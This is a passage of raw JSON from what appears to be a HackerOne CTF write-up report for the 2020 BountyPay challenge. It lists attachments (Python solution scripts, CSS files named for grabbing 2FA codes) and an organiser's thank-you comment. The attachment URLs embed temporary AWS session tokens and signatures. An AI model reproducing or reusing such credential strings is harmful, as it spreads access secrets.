Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":859851,"file_name":"ctf_part1.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QuZWtinRL3nHdvWBjE9yYYrL?response-content-disposition=attachment%3B%20filename%3D%22ctf_part1.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part1.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=cc34fe6377ff370b2712028544c6e7fe6b9203eb4420c9f06b0636eab972c761","file_size":1356,"type":"text/plain"},{"id":859852,"file_name":"ctf_part2.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fZADTsJfEfdmEP1Phd94S2DS?response-content-disposition=attachment%3B%20filename%3D%22ctf_part2.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part2.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=54fbf88770ff09ad87384c03e9059fb5459c8900aa32556ae7d0f265e5db2042","file_size":1994,"type":"text/plain"},{"id":859853,"file_name":"grab_2fa_code.css","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wy6RpAihjCtqvNFEDh8zuKko?response-content-disposition=attachment%3B%20filename%3D%22grab_2fa_code.css%22%3B%20filename%2A%3DUTF-8%27%27grab_2fa_code.css\u0026response-content-type=text%2Fcss\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=da6329e313bbf39d5b2ecebb44c325268a0f4247efebc4e54c80b7031b158861","file_size":59023,"type":"text/css"},{"id":859854,"file_name":"ctf_part3.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MXJiXKQ9cpesTbteGJGqVPYP?response-content-disposition=attachment%3B%20filename%3D%22ctf_part3.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part3.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=5410ae1a67784a77329d6ef377aeb90e2e1ac03c55189c3e8bbd78619ab1c992","file_size":2733,"type":"text/plain"},{"id":859855,"file_name":"find_code_input_fields.css","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5yQCbFNitwPKas1LoKGx3ay9?response-content-disposition=attachment%3B%20filename%3D%22find_code_input_fields.css%22%3B%20filename%2A%3DUTF-8%27%27find_code_input_fields.css\u0026response-content-type=text%2Fcss\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=34e831c53ab095522952dc841f84a741e43bd58e9880a6d6b4b7041066de166e","file_size":7253,"type":"text/css"},{"id":859856,"file_name":"fireworks.gif","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AWSHrbABJ88e54i68owHUKnK?response-content-disposition=attachment%3B%20filename%3D%22fireworks.gif%22%3B%20filename%2A%3DUTF-8%27%27fireworks.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=62ece4535e8db53cc475def266c6c3626f3f02f0d4d2268e00eb0da703b14725","file_size":481655,"type":"image/gif"},{"id":859857,"file_name":"PartThreeActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UUDQcXGt4LrNiSNjNzcGhrxf?response-content-disposition=attachment%3B%20filename%3D%22PartThreeActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartThreeActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=ac57be5e677eba95f51abceff022cb31c8a8e8e92f134d1e21981e8e187bb3a3","file_size":12442,"type":"text/x-java"},{"id":859858,"file_name":"PartTwoActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/omvKHAQdg6T2947xedpyTg5S?response-content-disposition=attachment%3B%20filename%3D%22PartTwoActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartTwoActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=778d1d85324ae5eaa4904625b268b9eedd00161505c18ed8b7961e5c006090ae","file_size":5455,"type":"text/x-java"},{"id":859859,"file_name":"PartOneActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sjC7HydKe68xJRniy7M2VJHo?response-content-disposition=attachment%3B%20filename%3D%22PartOneActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartOneActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070731Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026X-Amz-Signature=5659ae6a043077d1c47afe856e90702ddc0d17dec34d58b1184bf8413909144e","file_size":2957,"type":"text/x-java"}],"allow_singular_disclosure_at":"2020-07-17T23:47:12.435Z","allow_singular_disclosure_after":-14196019.433983289,"singular_disclosure_allowed":true,"vote_count":5,"voters":["nytr0gen","mvc","brahim_boufakri01","romesful","zeroxyele"],"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8245281,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-09T17:10:16.553Z","updated_at":"2020-06-09T17:10:16.553Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a 